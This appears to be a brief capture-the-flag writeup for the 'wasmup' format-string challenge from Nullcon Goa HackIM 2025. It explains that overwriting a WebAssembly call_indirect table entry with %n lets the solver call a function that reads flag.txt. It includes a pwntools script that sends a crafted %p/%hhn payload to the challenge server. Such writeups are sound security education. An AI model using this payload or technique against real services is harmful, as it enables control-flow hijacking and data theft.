---
title: "wasmup - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "format-string"
type: "writeup"
tags: ["pwn", "format-string", "wasm", "wasmup", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "I ran with wasmer and find out that flag.txt is in isolated area"
source:
  name: "CTFtime writeup #40031"
  url: "https://ctftime.org/writeup/40031"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "wasmup"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** wasmup
- **Author team:** 🐧‎
- **CTFtime:** <https://ctftime.org/writeup/40031>

---
By st4rlight:

I ran with wasmer and find out that flag.txt is in isolated area

so maybe we need to load flag.txt and write it right

Then we saw that %n works

first find how to overwrite call_indirect table

and call function that reads flag.txt

```  
from pwn import *

p = remote("52.59.124.14",5005)  
#p = process(["./wasmer","run","wasm_bin"])

p.recv()  
p.sendline(p32(0x11bac) + b"A"*20 + b"B"*(0x102-22) + b"%p%p%p%p%p%p%p%p%hhn")

p.interactive()  
```
